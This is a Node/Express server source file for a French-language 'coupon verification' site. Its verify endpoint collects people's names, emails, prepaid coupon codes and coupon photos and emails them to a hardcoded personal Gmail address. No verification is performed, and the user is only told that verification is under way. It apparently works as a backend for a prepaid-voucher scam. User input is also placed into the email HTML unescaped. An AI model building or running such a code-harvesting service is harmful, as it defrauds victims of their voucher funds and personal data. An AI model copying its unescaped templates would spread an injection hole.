import express from "express";
import path from "path";
import nodemailer from "nodemailer";
import dotenv from "dotenv";
import { createServer as createViteServer } from "vite";

dotenv.config();

const app = express();
const PORT = 3000;

// Set high limits for JSON payload to handle base64 coupon image uploads
app.use(express.json({ limit: "50mb" }));
app.use(express.urlencoded({ limit: "50mb", extended: true }));

/**
 * Helper to build a safe email transport
 * Lazy initialized to avoid crashing if credentials aren't provided yet
 */
function getEmailTransport() {
  const host = process.env.SMTP_HOST || "";
  const port = parseInt(process.env.SMTP_PORT || "587", 10);
  const user = process.env.SMTP_USER || "";
  const pass = process.env.SMTP_PASS || "";
  const secure = process.env.SMTP_SECURE === "true";

  if (!host || !user || !pass) {
    console.log("⚠️ SMTP configuration is incomplete. Email notifications will be logged to console in development.");
    return null;
  }

  return nodemailer.createTransport({
    host,
    port,
    secure,
    auth: {
      user,
      pass,
    },
  });
}

// Endpoint - Support Contact Submission
app.post("/api/contact", async (req, res) => {
  try {
    const { name, email, subject, message } = req.body;

    if (!name || !email || !message) {
      return res.status(400).json({ error: "Veuillez remplir tous les champs obligatoires (nom, email, message)." });
    }

    const targetEmail = process.env.SUPPORT_EMAIL || "sillyfr079@gmail.com";
    console.log(`[Support Contact] Message received from ${name} (${email}) to ${targetEmail}`);

    const transport = getEmailTransport();
    const mailOptions = {
      from: process.env.SMTP_USER || `"CouponCheck Pro Support" <noreply@example.com>`,
      to: targetEmail,
      subject: `[Support Contact] ${subject || "Nouveau message"}`,
      html: `
        <h2>Nouveau contact de support de ${name}</h2>
        <p><strong>Nom:</strong> ${name}</p>
        <p><strong>Email:</strong> ${email}</p>
        <p><strong>Sujet:</strong> ${subject || "Sans sujet"}</p>
        <p><strong>Message:</strong></p>
        <div style="background: #f7f7f9; padding: 15px; border-left: 4px solid #6c63ff; white-space: pre-wrap;">${message}</div>
      `,
    };

    if (transport) {
      await transport.sendMail(mailOptions);
      console.log("✅ Contact email sent successfully via SMTP.");
    } else {
      console.log("ℹ️ Simulated email delivery active. Payload received:");
      console.log(JSON.stringify({ to: targetEmail, subject, name, email }, null, 2));
    }

    return res.json({ success: true, message: "Votre demande de support a été envoyée avec succès." });
  } catch (error: any) {
    console.error("Error in support contact route:", error);
    return res.status(500).json({ error: "Une erreur est survenue lors de l'envoi du message: " + error.message });
  }
});

// Endpoint - Coupon Code Verification Submit
app.post("/api/verify", async (req, res) => {
  try {
    const {
      firstName,
      lastName,
      email,
      couponType,
      otherCoupon,
      couponCode,
      hideCode,
      couponImageName,
      couponImageBase64,
    } = req.body;

    if (!firstName || !lastName || !email || !couponCode || !couponType) {
      return res.status(400).json({ error: "Veuillez remplir tous les champs obligatoires." });
    }

    const targetEmail = process.env.SUPPORT_EMAIL || "sillyfr079@gmail.com";
    const selectedCouponName = couponType === "autres" ? (otherCoupon || "Autre non spécifié") : couponType;
    
    console.log(`[Coupon Verification Request] from ${firstName} ${lastName} (${email}) for type: ${selectedCouponName}`);

    // Create attachments collection if base64 image exists
    const attachments = [];
    if (couponImageBase64 && couponImageBase64.includes(";base64,")) {
      const parts = couponImageBase64.split(";base64,");
      const base64Content = parts.pop();
      if (base64Content) {
        attachments.push({
          filename: couponImageName || "coupon_uploaded.png",
          content: Buffer.from(base64Content, "base64"),
        });
      }
    }

    const transport = getEmailTransport();
    const mailOptions = {
      from: process.env.SMTP_USER || `"CouponCheck Pro" <noreply@example.com>`,
      to: targetEmail,
      subject: `[Nouveau Coupon] ${selectedCouponName.toUpperCase()} - ${firstName} ${lastName}`,
      html: `
        <div style="font-family: Arial, sans-serif; max-width: 600px; border: 1px solid #ddd; padding: 20px; border-radius: 8px;">
          <h2 style="color: #6c63ff; border-bottom: 2px solid #6c63ff; padding-bottom: 10px;">Demande de vérification de Coupon</h2>
          <table style="width: 100%; border-collapse: collapse; margin-top: 15px;">
            <tr>
              <td style="padding: 8px; font-weight: bold; width: 150px; border-bottom: 1px solid #eee;">Nom complet:</td>
              <td style="padding: 8px; border-bottom: 1px solid #eee;">${firstName} ${lastName}</td>
            </tr>
            <tr>
              <td style="padding: 8px; font-weight: bold; border-bottom: 1px solid #eee;">Adresse Email:</td>
              <td style="padding: 8px; border-bottom: 1px solid #eee;">${email}</td>
            </tr>
            <tr>
              <td style="padding: 8px; font-weight: bold; border-bottom: 1px solid #eee;">Type de Coupon:</td>
              <td style="padding: 8px; border-bottom: 1px solid #eee; color: #ff6584; font-weight: bold;">${selectedCouponName}</td>
            </tr>
            <tr>
              <td style="padding: 8px; font-weight: bold; border-bottom: 1px solid #eee;">Code du Coupon:</td>
              <td style="padding: 8px; border-bottom: 1px solid #eee; font-family: monospace; font-size: 1.1em; background: #f6f6f6; letter-spacing: 1px;">
                ${couponCode}
              </td>
            </tr>
            <tr>
              <td style="padding: 8px; font-weight: bold; border-bottom: 1px solid #eee;">Masquer le code:</td>
              <td style="padding: 8px; border-bottom: 1px solid #eee;">${hideCode}</td>
            </tr>
          </table>
          <p style="margin-top: 20px; font-size: 0.9em; color: #666;">
            Ce coupon a été soumis pour vérification. L'image est attachée à cet email si elle a été fournie.
          </p>
        </div>
      `,
      attachments,
    };

    if (transport) {
      await transport.sendMail(mailOptions);
      console.log("✅ Coupon verification email sent successfully via SMTP.");
    } else {
      console.log("ℹ️ Simulated Coupon delivery active. Payload received:");
      console.log(JSON.stringify({ 
        to: targetEmail, 
        fullName: `${firstName} ${lastName}`, 
        email, 
        couponType: selectedCouponName, 
        couponCode, 
        hideCode,
        hasImage: attachments.length > 0 
      }, null, 2));
    }

    return res.json({ 
      success: true, 
      message: "Vérification en cours." 
    });
  } catch (error: any) {
    console.error("Error in coupon verify route:", error);
    return res.status(500).json({ error: "Une erreur est survenue durant le traitement: " + error.message });
  }
});

// Configure Vite or Static Asset delivery
async function startServer() {
  if (process.env.NODE_ENV !== "production") {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: "spa",
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(process.cwd(), "dist");
    app.use(express.static(distPath));
    app.get("*", (req, res) => {
      res.sendFile(path.join(distPath, "index.html"));
    });
  }

  app.listen(PORT, "0.0.0.0", () => {
    console.log(`🚀 [Full-Stack] Server running on http://localhost:${PORT}`);
  });
}

startServer();
